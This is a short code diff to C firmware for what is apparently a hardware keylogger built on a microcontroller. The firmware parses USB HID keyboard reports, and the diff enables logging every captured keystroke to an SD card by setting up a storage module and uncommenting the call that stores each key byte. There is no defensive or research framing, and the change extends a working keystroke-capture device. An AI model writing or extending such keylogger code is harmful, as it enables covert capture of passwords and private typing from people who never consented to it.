@@ -84,8 +84,11 @@ int main()
 
     // Sd card
     sd_spi_t sd;
-    storage_t storage;
     sd_spi_init(&sd,spi0_hw, 17, 19, 20, 18, 1);
+
+    // Storage
+    storage_t storage;
+    storage_init(&storage, &sd);
 
     int lc = 0;
 //    graphics_print_text(&display, "KEYLOGGER\nDisplay test");
@@ -109,6 +112,7 @@ int main()
         event_task();
         graphics_task(&display);
         sd_spi_task(&sd);
+        storage_task(&storage);
 
         /*if (!sd_init && !sio_get(1)) {
             sd = sd_spi_init(spi0_hw, 17, 19, 20, 18);
@@ -128,7 +132,7 @@ int main()
             int chars = hid_report_parse(&hid_parser, &hid_report, pressed_keys);
             for (int i = 0; i < chars; i++){
                 graphics_print_char(&display, pressed_keys[i]);
-                //storage_store_byte(&storage, pressed_keys[i]);
+                storage_store_byte(&storage, pressed_keys[i]);
             }
         }
         if (ft260_get_output_report(&ft260, &output_report)) {
